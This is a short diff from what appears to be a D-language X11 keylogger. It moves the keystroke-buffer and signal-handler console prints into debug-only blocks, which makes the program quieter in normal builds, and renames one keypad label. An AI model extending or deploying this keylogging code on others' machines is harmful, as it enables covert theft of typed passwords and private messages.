@@ -134,7 +134,9 @@ void logKey(string key) {
 	// pressed a key or typed 
 	// (Tell if they pressed Tab (Will show up as "[tab]") or typed Tab (will show up as "[ T a b ] "))
 	keyBuffer ~= key ~ " ";
-	writefln("keyBuffer size: %d", keyBuffer.length);
+	debug {
+		writefln("keyBuffer size: %d", keyBuffer.length);
+	}
 }
 
 // This function writes our keylog to disk
@@ -160,7 +162,7 @@ string getKey(int key) {
 		case 65367: return "[end]";
 		case 65379: return "[insert]";
 		case 65407: return "[numlock]";
-		case 65421: return "[numlockenter]";
+		case 65421: return "[numpadenter]";
 		case 65429: return "[numpadhome]";
 		case 65430: return "[numpadlarrow]";
 		case 65431: return "[numpaduarrow]";
@@ -234,6 +236,8 @@ string getFocusedWindowName(_XDisplay* d, ulong focus) {
 // Catch SIGINT/SIGTERM and write our keylogs to disk before exiting
 extern(C) void handler(int num) nothrow @nogc @system
 {
-    printf("Caught signal %d\n",num);
+	debug {
+		printf("Caught signal %d\n",num);
+	}
     doQuit = true;
 }
